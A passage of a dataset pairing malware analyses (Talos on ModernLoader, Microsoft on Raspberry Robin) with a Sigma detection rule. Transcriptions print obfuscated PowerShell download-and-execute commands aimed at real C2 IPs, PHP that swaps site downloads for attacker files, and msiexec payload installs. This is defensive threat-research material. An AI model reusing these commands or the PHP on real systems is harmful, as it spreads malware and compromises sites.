bypassing Windows defender. The module is similar to the `nana.go` payload, but contains more components. When the module is run, it drops the following files:\n\n- `%APPDATA%\\nexts\\killduplicate.cmd`\n- `%APPDATA%\\nexts\\mine.exe` - Silent Crypt miner\n- `%APPDATA%\\nexts\\output.exe`\n- `%LOCALAPPDATA%\\appdata.exe`\n- `%APPDATA%\\winserv\\killduplicate.cmd`\n- `%APPDATA%\\winserv\\appdata.exe`\n- `%APPDATA%\\winserv\\updatershelper.exe`\n- `%APPDATA%\\install+\\appdata.bat`\n- `%APPDATA%\\install+\\killduplicate.cmd`\n- `%APPDATA%\\links\\killduplicate.cmd`\n- `%APPDATA%\\links\\mine.exe`\n- `%APPDATA%\\link\\killduplicate.cmd`\n- `%APPDATA%\\link\\mine.exe`\n- `%APPDATA%\\link\\mines.exe`\n- `%APPDATA%\\onedrive\\onedrive.exe`\n- `%LOCALAPPDATA%\\onedrive\\onedrive.exe`\n- `%APPDATA%\\drives\\off.bat`\n- `%APPDATA%\\drives\\updatershelper.exe`\n- `%APPDATA%\\google\\libs\\wr64.sys`\n\nThe modules are focused on establishing an environment to mine cryptocurrency, with miners and auxiliary modules tasked with disabling Windows updates and Windows Defender.\n\n#### Ws.go\n\n`Ws.go` module (`dd24e5596c318b30c05cffc7467f5649564ab93874c9201bf758a1a2ce05228c`) is observed as downloaded and executed by one of the tasks launched by the C2 server to the ModernLoader.\n\n`Ws.go` contains the already described PowerShell three assembly module loader scheme which attempts to inject the module `XBinder-Output.exe` (`40d68523748f6eaf765970a40458faccbe84ef5dff7acbdaf29ac5a69d7cae6f`). `XBinder-Output.exe` contains a VB script `WindowsConfiguration.vbs` (`c103c7686739669f3cfc123de34bdadb803c4ec8727cf12cd7cdc56be4bf60e1`) in its resource section. The resource is encrypted and when decrypted is saved on the disk as `%LOCALAPPDATA%\\OneDrive\\WindowsConfiguration.vbs` and started.\n\nThe VB script is a wrapper for PowerShell code which attempts to download and run the initial ModernLoader loader module from hxxp[://]31[.]41[.]244[.]231/0x/Loader[.]go.\n\n```image\nAlt: Ws.go drops and runs code to execute the initial ModernLoader loader.\nDescription: The image is a code snippet in PowerShell, showcasing a script that appears to be related to the execution of a malicious payload. It includes obfuscated commands that construct paths and URLs to download a loader module from a specified command and control (C2) server. The script manipulates strings to create a command that is likely intended to execute malicious actions on a compromised system.\nTranscription: |\n  $c1='{LOGON}{N{LOGON}e{LOGON}w-{LOGON}o{LOGON}b{LOGON}j{LOGON}e{LOGON} N{LOGON}e{LOGON}t{LOGON}w{LOGON}o{LOGON}r{LOGON}k{LOGON}e{LOGON}';\n  $c4='b{LOGON}l{LOGON}i{LOGON}n{LOGON}e{LOGON}.Do{LOGON}v{LOGON}i{LOGON}c{LOGON}e{LOGON}';\n  $c3='a{LOGON}d{LOGON}s{LOGON}t{LOGON}r{LOGON}i{LOGON}b{LOGON}e{LOGON}';\n  $tc=('{h{LOGON}tt{LOGON}p://31.41.244.231/0x/Loader.go''}');\n  $TC=$tc.replace('{LOGON}', '');\n  IEX $TC IEX\n```\n\n`XBinder-Output` sets the registry value `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsConfiguration` to point to the dropped WindowsConfiguration VB script so it is run every time the user logs onto the system.\n\n#### SmartScreen.ps\n\nDownloaded by `1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5` which first loads a small script from hxxp[://]31[.]41[.]244[.]231/AVAVA/WAW/APPDATA/go.oo eventually loads an instance of ModernLoader connecting to the same C2 IP URL hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php.\n\n#### Auto.oo\n\n`Auto.oo` is an auxiliary module also downloaded by `1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5`, and it launches an instance of SharpHide (`881235fca4aeeb88950b952c0d9ce1a7d9a4eb838ce7d79447a26d2f45b1eaa5`) which creates a hidden registry entry to start a copy of the SmartScreen Module every time the user logs onto the system.\n\n#### XboxLive.ps\n\nDownloaded by `1ddbf6cb9e4c92e93118d8f2ca98922195cf683926777b2c160f5d05d52f3fd5`, which first downloads and runs a small script from hxxp[://]31[.]41[.]244[.]231/AVAVA/WAW/Documents/go.oo and eventually loads an instance of the ModernLoader (`09db213df3dbd950a8bc75246be72f5b572b00dbd3a5bba45c7074443d0928a7`) into the process space of `svchost.exe` configured to connect to the same C2 URL hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php.\n\nEach campaign has its own unique version name although the functionality of the loader is the same. The first loader version is “Live” while `SmartScreen.ps` and `XBoxLive.ps` each have their own version name which can presumably be tracked in the C2 server panel by the operator.\n\n#### R0.go\n\nThis module has been spotted in the dynamic analysis of the 7-Zip self-extracting dropper `4a6ef2379195140aa31d339329ca06bd28589fa13fd88cfcf9d76cb2d4ab99c1`. The module is a three assembly PowerShell which loads an obfuscated injector for a variant of the DcRAT (`2c631588c491aa32c20f6a99201ba82982a31b1c763054562d59cd1a5a1ea14b`).\n\nThe loader is first injected into the process space of `RegSvcs.exe` and then into the process space of a newly created `svchost.exe` process.\n\nThe DcRAT client is configured to connect to the IP address 31.41.244.235, just as the other RATs in this campaign. The TCP port to use is 8848. At the time of analysis, the host was not accessible.\n\n```image\nAlt: Decrypted DcRAT configuration data.\nDescription: The image shows a snippet of configuration data related to the DcRAT malware. It includes various settings such as the host IP address (31.41.244.235), TCP port (8848), and details regarding the server certificate, including the subject name (CN=DcRat) and issuer information. The information is formatted in a way that suggests it is extracted from a script or a configuration file, indicating the technical parameters used by the malware.\nTranscription: |\n  Settings.Hos_ts: \"31.41.244.235\"\n  Settings.Por_ts: \"8848\"\n  Settings.MTX: \"x$x$_x$x\"\n  Settings.Group: \"x$x$\"\n  Settings.Server_Certificate.SubjectName.Name: \"CN=DcRat\"\n  Settings.Server_Certificate.Issuer: \"C=CN, L=SH, O=DcRat By qwdanchun,\"\n```\n\n## Additional payloads\n\n### Discord Spreader\n\nWhile searching for other modules communicating with C2 servers we spotted a file `838170edffbca1cadef3b7039330376c1aad914883103834c25e9bb92d9bfad1`, purporting to be a copy of the µTorrent Web BitTorrent client. Once executed the file drops another randomly named file, which is a downloader written in Visual Basic with the code similar to other `Offer.exe` downloaders. The downloader, `9b347b48026f205733abbc24c502dfff5428341e10c6944687cdbfe70770f5f3`, executes the following PowerShell command to download and run code from 62[.]204[.]41[.]71.\n\n```image\nAlt: Discord Spreader module download.\nDescription: The image displays a segment of obfuscated PowerShell code. It appears to be part of a script used in a malicious payload, likely related to the Discord Spreader module mentioned in the context. The code contains variables that are concatenated to form a PowerShell command, which is intended to download and execute further malicious content from a specified IP address (62.204.41.71). The obfuscation technique makes it harder for analysts to read and understand the script at first glance.\nTranscription: \"pwsh.exe\" $c1='{IN}{N}{e}{IN}w-{IN}{j}{IN}e{IN}n{IN}t.{IN}Do{IN}{w}{IN}n{IN}l{IN}o';$c3='a{IN}h{IN}ri{IN}n{IN}g{IN}h{IN}tt{IN}p:/ {IN}/62.204.41.71/TIWO/IN.oo' ''; $c4='b{IN}C{IN}li{IN}e{IN}';$TC=($c1,$c4,$c3 -Join '');$TC=$TC.replace('{IN}',''); IEX $TC | IEX\n```\n\nThe interesting thing about the dropper is that it is based on the Project Discord Spreader, an open-source module available on GitHub. The utility is a Discord token stealer which may be used to spread the original file on Discord by sending messages to channels where the user of the stolen Discord tokens is active. The spreader can also include a user-mode rootkit `r77` or additional payloads in the assembly `ManifestResource` stream. A builder is available to create new instances of the spreader and the sample used in this campaign was obfuscated with .NET obfuscators.\n\n```image\nAlt: The Discord Spreader builder.\nDescription: The image displays a user interface of a builder tool for a malware component named 'Discord Spreader'. It includes checkboxes for options like 'Do a uacbypass', 'Copy to appdata', 'Spread self file(discord)', 'execute rootkit', and 'Run payload'. There are text fields for the filename that will appear in Discord and a message that will be sent along with the file. The filename is set to 'loveme.exe' and the accompanying message is 'LOLz'. The interface suggests it is designed for creating and configuring a malicious executable intended for distribution through Discord.\nTranscription: |\n  Builder\n  Info\n  [ ] Do a uacbypass\n  [ ] Copy to appdata\n  [✓] Spread self file(discord)\n  [ ] execute rootkit\n  Filename (that will appear in discord)\n  loveme .exe\n  Message (that will send along the file)\n  LOLz\n  [✓] Run payload\n  Select payload\n  Payload selected: None\n  Payload added: False\n```\n\nThe author also left a message in the code to “help” anti-malware researchers when analyzing the sample.\n\n```image\nAlt: The message to analysts.\nDescription: The image displays a snippet of code, specifically a public static string declaration in C#. The message appears to be a note from the author, identified as 'moom825', addressed to malware analysts. It offers insights into the functioning of a piece of malware, indicating that the class named 'settings' contains configurations related to browser names. The author mentions that the tool is open source and provides a GitHub link for further analysis. The tone is informal, suggesting a desire to assist analysts in understanding the malware's behavior.\nTranscription: |\n  public static string message_to_malware_analysts = @\"HELLO! im moom825 (not who ever is distributing this), I created this message to help malware analysts or whoever opened up dnspy/ilspy to look at this. So lets get started, the class named settings is all the settings for this built exe. the only thing obfuscated in this are browser names(found in GetThem()), well unless someone else obfuscated this. Did i mention this tool is open source?\n  heres the source: https://github.com/moom825/discord-autospreader. You should be able to look at the source and understand whats going on. well, have a great rest of your day!\";\n```\n\n### Amazon offer added to archives\n\nThis technique was observed on one of the infected systems in our telemetry. We observed the addition of a fake Amazon voucher named `Amazon.com Gift Card 500 USD.gift.hta` to archive files, such as RAR, 7-Zip, and ZIP already present on the infected system. Each file’s checksum is different, which indicates use of mild obfuscation to evade detection.\n\nWe were unable to retrieve those HTA files from the infected systems but found a related file on VirusTotal, (`5750d8d557fdcb6afb2d8cb52993fb07ac84a63aab0afc44efe30ffe08d48c2f`), which contains code to communicate with 62[.]204[.]41[.]71 and whose filename is “Amazon Gift Card 500 USD.gift.vbs.” The script first attempts to call PowerShell to download and run code from the URL hxxp://62[.]204[.]41[.]71/SPM/Spam.o' and then opens the browser to a link created by the URL shortening service hxxps://goo[.]su/DaqHw open a page that offers the user an alleged free Amazon gift card worth $500 USD.\n\n### PHP scripts\n\nThe actor seems to be interested in compromising vulnerable web applications and changing their configuration so that malicious PHP scripts serve malicious content to the users of the compromised application.\n\nOne particular file, `artadd.php` (`9704fa1a8242643f66572e7ee68e4e7d7bec9e7054319b8551fed4b3b0ccdd45`) has been found in a few instances of compromised WordPress and CPanel applications. The file is obfuscated with a very simple obfuscation scheme and it eventually executes the code to download additional components `futer.php` (`a249c275b0ad384ae1906d2ec169f77abce9d712ab8470eb5fe7040a71948026`) and `.htaccess` (`f013d15d2203ec6a90be789d4b58c99ca7e42d9beedb9c4c0b05f599e2eb0ea`) from 62[.]204[.]41[.]192.\n\n```image\nAlt: PHP script on compromised apps downloads additional components.\nDescription: The image displays a snippet of PHP code that demonstrates how a compromised web application can be manipulated to download and serve malicious files. It contains functions that set the document root and write two files: 'futer.php' and '.htaccess' to the server's file system. The code connects to a remote server (IP: 62.204.41.192) to fetch these files, indicating an attempt to execute malicious actions on the server.\nTranscription: |\n  php\n  global $color, $default_action, $default_use_ajax, $default_charset, $os, $safe_mode, $cwd, $home_cwd, $aliases;\n  $link = \"http://62.204.41.192/D1\"; //ссылка\n  $root = (filter_input(INPUT_SERVER, 'DOCUMENT_ROOT'));\n  file_put_contents($root.'/futer.php', file($link.'getfile.php?file=futer.php'));\n  file_put_contents($root.'/.htaccess', file($link.'getfile.php?file=.htaccess'));\n```\n\nThe function of the `.htaccess` file is in this case to configure redirects to the `futer.php` if the browser accesses any files on the site with the extensions `.zip`, `.exe`, or `.rar`. If the extension in the request matches the above, `futer.php` will execute code that retrieves a file from the actor’s command and control (C2) server and serve that instead of the requested executable.\n\n```image\nAlt: PHP file attempts to replace a requested file with a malicious file from the C2 server.\nDescription: The image displays a code snippet written in PHP. It appears to be part of a script that processes file requests on a server. The script checks if a requested file exists and sets the content type accordingly. If the file does not exist, it checks for a specific cookie and, if present, redirects the request to a remote server (with the IP address 62.204.41.192) to serve a potentially malicious file instead. The code includes error handling for when the requested URL is not found.\nTranscription: |\n  php\n  $realfilepath = $_SERVER['DOCUMENT_ROOT'].'/'.$full_name;\n  if(file_exists($realfilepath)){\n      switch($path['extension']){\n          default: $content_type = 'octet-stream'; break;\n      }\n      header('Content-type: application/'.$content_type);\n      header('Content-Disposition: attachment; filename=\"'.$file.'\"');\n      if($_COOKIE['fooled']!='1'){\n          readfile($realfilepath);\n      } else {\n          setcookie('fooled', \"1\", time() + 7 * 24 * 60 * 60 * 1000);\n          readfile('http://62.204.41.192/DO/1.'.$path['extension']);\n      }\n  } else {\n      die(\"404 Not FoundNot FoundThe requested URL \".$_SERVER['REQUEST_URI'].\" was not found on this server.\");\n  }\n```\n\n## Summary\n\nThis post represents the most notable portions of three campaigns we discovered in June. These campaigns portray an actor experimenting with different technology. The usage of ready-made tools shows that the actor understands the TTPs required for a successful malware campaign but their technical skills are not developed enough to fully develop their own tools. As a consequence of using off-the-shelf tools, the group improves its operational security and there are no obvious signs of who the actor behind the attacks is, except that they likely speak Russian.\n\n```image\nAlt: The most recent ModernLoader campaign modules.\nDescription: The image is a flowchart detailing the modules used in the ModernLoader campaigns. It includes various components like 'ModernLoader,' 'Redline stealer,' 'DcRAT,' 'SystemBC,' and 'Sapphire miner,' connected by arrows indicating their relationships. Additionally, it shows Command and Control (C2) server IP addresses, such as '31.41.244.231' and '31.41.244.235,' alongside different types of loaders and dropper files. The overall layout is designed to illustrate the structure and flow of the malware components within the campaigns.\nTranscription: |\n  ModernLoader campaign modules\n  \n  31.41.244.231 ModernLoader C2\n      ├── ModernLoader\n      │   ├── PowerShell assembly loaders\n      │   │   └── Offer.exe downloaders\n      │   └── Vs_community 7z SFX droppers\n      └── 31.41.244.235 RATs and stealers C2\n          ├── Redline stealer\n          ├── DcRAT\n          ├── SystemBC\n          ├── RDP service (RDPWrap)\n          ├── Sapphire miner\n          └── xmrig\n```\n\nThe actor is frequently using open-source components and code generators to achieve its goals. A number of remote access tools, stealers, and cryptominers are used in the campaigns to eventually reap financial benefits for the actor. The actor has an interest in alternative distribution channels such as compromised web applications, archive infections, and spreading by using Discord webhooks. Despite all the techniques and tactics used, we estimate that the success of these campaigns is limited. Cisco Talos continues to monitor all available sources for signs of similar campaigns.\n\n# Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n```image\nAlt: Coverage\nDescription: The image is a table that lists various Cisco security products and their effectiveness against a specific threat. Each row represents a different product, including Cisco Secure Endpoint, Cisco Secure Malware Analytics, Cisco Secure Email, Cisco Umbrella DNS Security, Cisco Secure Firewall/Secure IPS, and Cisco Secure Web Appliance. A checkmark indicates that the product can defend against the threat mentioned, while a symbol indicating 'N/A' signifies that the product's status is not applicable. The table uses a structured format with product names in bold and a color-coded checkmark system to convey information clearly.\nTranscription: |\n  | Cisco Secure Endpoint (AMP for Endpoints)    | Cloudlock                   | Cisco Secure Email | Cisco Secure Firewall/Secure IPS (Network Security) |\n  | -------------------------------------------- | --------------------------- | ------------------ | --------------------------------------------------- |\n  | ✅                                            | N/A                         | ✅                  | ✅                                                   |\n  | Cisco Secure Malware Analytics (Threat Grid) | Cisco Umbrella DNS Security | Cisco Umbrella SIG | Cisco Secure Web Appliance (Web Security Appliance) |\n  | ✅                                            | ✅                           | ✅                  | ✅                                                   |\n```\n\nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.\n\nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.\n\nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.\n\nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance, and Meraki MX can detect malicious activity associated with this threat.\n\nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.\n\nUmbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.\n\nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center.\n\nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.\n\n## Orbital Queries\n\nCisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries on this threat, click here and here.\n\n# Indicators of Compromise\n\nIndicators of Compromise associated with this threat can be found here.",
    "sigma_rule": {
      "title": "Wscript Shell Run In CommandLine",
      "id": "2c28c248-7f50-417a-9186-a85b223010ee",
      "status": "test",
      "description": "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity",
      "references": [
        "https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/",
        "https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-31",
      "modified": "2023-05-15",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "Wscript.",
            ".Shell",
            ".Run"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mshta_inline_vbscript.yml",
    "id": "262"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
    "markdown": "# Raspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity\n\n**October 27, 2022**\n\n---\n\n> **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather.\n>\n> - **DEV-0206** is now tracked as **Mustard Tempest**\n> - **DEV-0243** is now tracked as **Manatee Tempest**\n> - **DEV-0950** is now tracked as **Lace Tempest**\n> - **DEV-0651** is now tracked as **Storm-0651**\n> - **DEV-0856** is now tracked as **Storm-0856**\n>\n> To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.\n\nMicrosoft has discovered recent activity indicating that the Raspberry Robin worm is part of a complex and interconnected malware ecosystem, with links to other malware families and alternate infection methods beyond its original USB drive spread. These infections lead to follow-on hands-on-keyboard attacks and human-operated ransomware activity. Our continuous tracking of Raspberry Robin-related activity also shows a very active operation: Microsoft Defender for Endpoint data indicates that nearly 3,000 devices in almost 1,000 organizations have seen at least one Raspberry Robin payload-related alert in the last 30 days.\n\nRaspberry Robin has evolved from being a widely distributed worm with no observed post-infection actions when Red Canary first reported it in May 2022, to one of the largest malware distribution platforms currently active. In July 2022, Microsoft security researchers observed devices infected with Raspberry Robin being installed with the FakeUpdates malware, which led to DEV-0243 activity. DEV-0243, a ransomware-associated activity group that overlaps with actions tracked as EvilCorp by other vendors, was first observed deploying the LockBit ransomware as a service (RaaS) payload in November 2021. Since then, Raspberry Robin has also started deploying IcedID, Bumblebee, and Truebot based on our investigations.\n\nIn October 2022, Microsoft observed Raspberry Robin being used in post-compromise activity attributed to another actor, DEV-0950 (which overlaps with groups tracked publicly as FIN11/TA505). From a Raspberry Robin infection, the DEV-0950 activity led to Cobalt Strike hands-on-keyboard compromises, sometimes with a Truebot infection observed in between the Raspberry Robin and Cobalt Strike stage. The activity culminated in deployments of the Clop ransomware. DEV-0950 traditionally uses phishing to acquire the majority of their victims, so this notable shift to using Raspberry Robin enables them to deliver payloads to existing infections and move their campaigns more quickly to ransomware stages.\n\nGiven the interconnected nature of the cybercriminal economy, it’s possible that the actors behind these Raspberry Robin-related malware campaigns—usually distributed through other means like malicious ads or email—are paying the Raspberry Robin operators for malware installs.\n\nRaspberry Robin attacks involve multi-stage intrusions, and its post-compromise activities require access to highly privileged credentials to cause widespread impact. Organizations can defend their networks from this threat by having security solutions like Microsoft Defender for Endpoint and Microsoft Defender Antivirus, which is built into Windows, to help detect Raspberry Robin and its follow-on activities, and by applying best practices related to credential hygiene, network segmentation, and attack surface reduction.\n\nIn this blog, we share our detailed analysis of these attacks and shed light on Raspberry Robin’s origins, since its earliest identified activity in September 2021, and motivations which have been debated since it was first reported in May 2022. We also provide mitigation guidance and other recommendations defenders can use to limit this malware’s spread and impact from follow-on hands-on-keyboard attacks.\n\n## A new worm hatches: Raspberry Robin’s initial propagation via USB drives\n\n> The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response.\n\nIn early May 2022, Red Canary reported that a new worm named Raspberry Robin was spreading to Windows systems through infected USB drives. The USB drive contains a Windows shortcut (LNK) file disguised as a folder. In earlier infections, this file used a generic file name like _recovery.lnk_, but in more recent ones, it uses brands of USB drives. It should be noted that USB-worming malware isn’t new, and many organizations no longer track these as a top threat.\n\nFor an attack relying on a USB drive to run malware upon insertion, the targeted system’s _autorun.inf_ must be edited or configured to specify which code to start when the drive is plugged in. Autorun of removable media is disabled on Windows by default. However, many organizations have widely enabled it through legacy Group Policy changes.\n\nThere has been much public debate about whether the Raspberry Robin drives use autoruns to launch or if it relies purely on social engineering to encourage users to click the LNK file. Microsoft Threat Intelligence Center (MSTIC) and Microsoft Detection and Response Team (DART) research has confirmed that both instances exist in observed attacks. Some Raspberry Robin drives only have the LNK and executable files, while drives from earlier infections have a configured _autorun.inf_. This change could be linked to why the names of the shortcut files changed from more generic names to brand names of USB drives, possibly encouraging a user to execute the LNK file.\n\nUpon insertion of the infected drive or launching of the LNK file, the UserAssist registry key in Windows—where Windows Explorer maintains a list of launched programs—is updated with a new value indicating a program was launched by Windows.\n\n```image\nAlt: This diagram shows the linear progression of earlier Raspberry Robin infections.\nDescription: The image is a flowchart illustrating the attack chain of the Raspberry Robin worm. It visually represents the sequence of actions that occur when the USB attachment is inserted. The steps include: 1. Inserting the USB attachment, 2. The LNK file creating a CMD.exe process, 3. The MSiexec.exe using the device's username and hostname to connect to command-and-control (C2) servers, and 4. Continued call outs to TOR nodes. Each step is depicted with icons and arrows indicating the progression of the attack.\nTranscription: |\n  [Diagram]\n  \n  USB attachment inserted\n      ↓\n  LNK file creates a CMD.exe process\n      ↓\n  MSIexec.exe using the device username and hostname connects to C2\n      ↓\n  Continued call outs to TOR nodes\n```\n\n_Figure 1. Attack chain of the original Raspberry Robin infections_\n\nThe UserAssist key stores the names of launched programs in ROT13-ciphered format, which means that every letter in the name of the program is replaced with the 13th letter in the alphabet after it. This routine makes the entries in this registry key not immediately readable. The UserAssist key is a useful forensic artifact to demonstrate which applications were launched on Windows, as outlined in Red Canary’s blog.\n\nWindows shortcut files are mostly used to create an easy-to-find shortcut to launch a program, such as pinning a link to a user’s browser on the taskbar. However, the format allows the launching of any code, and attackers often use LNK files to launch malicious scripts or run stored code remotely. Raspberry Robin’s LNK file points to _cmd.exe_ to launch the Windows Installer service _msiexec.exe_ and install a malicious payload hosted on compromised QNAP network attached storage (NAS) devices.\n\n```image\nAlt: Screenshot of command lines where Raspberry Robin uses the Windows installer service to connect to an external domain.\nDescription: The image displays a series of command line entries showing how the Raspberry Robin worm utilizes the Windows Installer service (msiexec) to connect to an external domain for downloading or executing malicious payloads. The commands include variations of the msiexec command, formatted with different case sensitivity, and reference an HTTP protocol connection to a domain along with a randomly generated path that likely incorporates the host name and username. This illustrates the mechanism by which the worm executes its payload upon infection.\nTranscription: |\n  MSiexEc /q-i \"http://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n  MsiEXEC /q /i \"http://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n  mSiexEc -Q\"Ihttp://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n```\n\n_Figure 2. Examples of URLs connecting to an external domain_\n\nOnce the Raspberry Robin payload is running, it spawns additional processes by using system binaries such as _rundll32.exe_, _odbcconf.exe_, and _control.exe_ to use as living-off-the-land binaries (LOLBins) to run malicious code. Raspberry Robin also launches code via _fodhelper.exe_, a system binary for managing optional features, as a user access control (UAC) bypass.\n\nThe malware injects into system processes including _regsvr32.exe_, _rundll32.exe_, and _dllhost.exe_ and connects to various command-and-control (C2) servers hosted on Tor nodes.\n\nIn most instances, Raspberry Robin persists by adding itself to the RunOnce key of the registry hive associated with the user who executed the initial malware install. The registry key points to the Raspberry Robin binary, which has a random name and a random extension such as _.mh_ or _.vdm_ in the user’s _AppData_ folder or to _ProgramData_. The key uses the intended purpose of _regsvr32.exe_ to launch the portable executable (PE) file, allowing the randomized non-standard file extension to launch the executable content.\n\n```image\nAlt: Screenshot of the contents of the RunOnce registry key where the value points to the randomly-named Raspberry Robin file.\nDescription: The image displays a snippet of command lines used in the Raspberry Robin worm's operation. It shows the execution of 'rundll32.exe' with parameters that involve calling 'SHELL32.DLL' and 'REGSVR32.EXE' to run a malicious payload located in the user's temporary directory. This illustrates the malware's method of executing commands and its reliance on legitimate system binaries to carry out its malicious activities.\nTranscription: \"C:\\Windows\\System32\\rundll32.exe\" SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE /u -S \"C:\\Users[UserName]\\AppData\\Local\\Temp\\cnsbi.mh.\"\n```\n\n_Figure 3. Example of the contents of the RunOnce key_\n\nEntries in the RunOnce key delete the registry entry prior to launching the executable content at sign-in. Raspberry Robin re-adds this key once it is successfully running to ensure persistence. After the initial infection, this leads to _RunOnce.exe_ launching the malware payload in timelines. Raspberry Robin also temporarily renames the RunOnce key when writing to it to evade detections.\n\n## Raspberry Robin’s connection to a larger malware ecosystem\n\nSince our initial analysis, Microsoft security researchers have discovered links between Raspberry Robin and other malware families. The Raspberry Robin implant has also started to distribute other malware families, which is not uncommon in the cybercriminal economy, where attackers purchase “loads” or installs from operators of successful and widespread malware to facilitate their goals.\n\n```image\nAlt: This diagram shows Raspberry Robin worm's connections to various malware campaigns and threat operators. It also shows different infection methods seen in Raspberry Robin-related activity.\nDescription: The image is a detailed diagram illustrating the infection chain and connectivity of the Raspberry Robin worm to various malware campaigns and threat operators. It includes initial infection vectors such as malicious ads and attacker-controlled servers, leading to different malware types like ROSHTYAK and LockBit ransomware. The diagram outlines specific malware variants, their deployment dates, and interaction with human-operated ransomware intrusions, emphasizing the interconnected nature of cyber threats.\nTranscription: |\n  Initial infection vectors\n  -------------------------\n  - Malicious ads\n  - Attacker-controlled intermediary server (DEV-0651)\n  - Command-and-control to compromised QNAP\n  - FAUPPOD-packed malware\n  - Public cloud infrastructure (e.g., Azure, Discord, GitHub, and SpiderOak)\n  \n  Connections to other malware\n  -----------------------------\n  - DEV-0206: FakeUpdates/SocGholish JavaScript\n  - DEV-0856: ROSHTYAK malware\n    - More Raspberry Robin victims via LNK USB infection\n  - DEV-0243: Cobalt Strike and interactive human-operated ransomware intrusion\n  - LockBit ransomware\n  - DEV-0249: IcedID\n  - DEV-0249: Bumblebee\n  - DEV-0950: Cobalt Strike and interactive human-operated ransomware intrusion\n  - Clop ransomware\n  - DEV-0950: Truebot\n```\n\n_Figure 4. Raspberry Robin’s connectivity to a larger cybercriminal ecosystem_\n\n### Introducing Fauppod: Like FakeUpdates but without the fake updates\n\nOn July 26, 2022, Microsoft witnessed the first reported instance of a Raspberry Robin-infected host deploying a FakeUpdates (also known as SocGholish) JavaScript backdoor. Previously, FakeUpdates were delivered primarily through drive-by downloads or malicious ads masquerading as browser updates. Microsoft tracks the activity group behind FakeUpdates as DEV-0206 and the USB-based Raspberry Robin infection operators as DEV-0856.\n\nAfter discovering Raspberry Robin-deployed FakeUpdates, Microsoft security researchers continued monitoring for other previously unidentified methodologies in FakeUpdates deployments. Research into the various malware families dropped by Raspberry Robin’s USB-delivered infections continued, and new signatures were created to track the various outer layers of packed malware under the family name Fauppod.\n\nOn July 27, 2022, Microsoft identified samples detected as Fauppod that have similar process trees with DLLs written by Raspberry Robin LNK infections in similar locations and using similar naming conventions. Their infection chains also dropped the FakeUpdates malware. However, the victim hosts where these samples were detected didn’t have the traditional infection vector of an LNK file launched from an infected USB drive, as detailed in Red Canary’s blog.\n\nIn this instance, Fauppod was delivered via _codeload[.]github[.]com_, a fraudulent and malicious repository created by a cybercriminal actor that Microsoft tracks as DEV-0651. The payload was delivered as a ZIP archive file containing another ZIP file, which then had a massive (700MB) Control Panel (CPL) file inside. Attackers use nested containers such as ZIP, RAR, and ISO files to avoid having their malicious payloads stamped with Mark of the Web (MOTW), which Windows uses to mark files from the internet and thus enable security solutions to block certain actions. Control Panel files are similar to other PEs like EXE and DLL files.\n\nMicrosoft has since seen DEV-0651 deliver Fauppod samples by taking advantage of various public-facing trusted and legitimate cloud services beyond GitHub, including Azure, Discord, and SpiderOak. Refer to the indicators of compromise (IOCs) below for more details. Microsoft has shared information about this threat activity and service abuse with these hosting providers.\n\n### Connecting the dot(net malware)\n\nWith the discovery of the DEV-0651 link, Microsoft had two pieces of evidence suggesting a relationship between Fauppod and Raspberry Robin:\n\n- Both malware families were delivering FakeUpdates\n- Signatures created to detect Raspberry Robin DLL samples on hosts infected by the publicly known LNK file spreading mechanism were detecting malware that wasn’t being delivered through any previously known Raspberry Robin connections\n\nFollowing DEV-0651’s previous leveraging of cloud hosting services, the earliest iteration of a DEV-0651-related campaign that Microsoft was able to identify occurred in September 2021, which was around the same time Red Canary stated Raspberry Robin began to propagate.\n\nBased on these facts, Microsoft 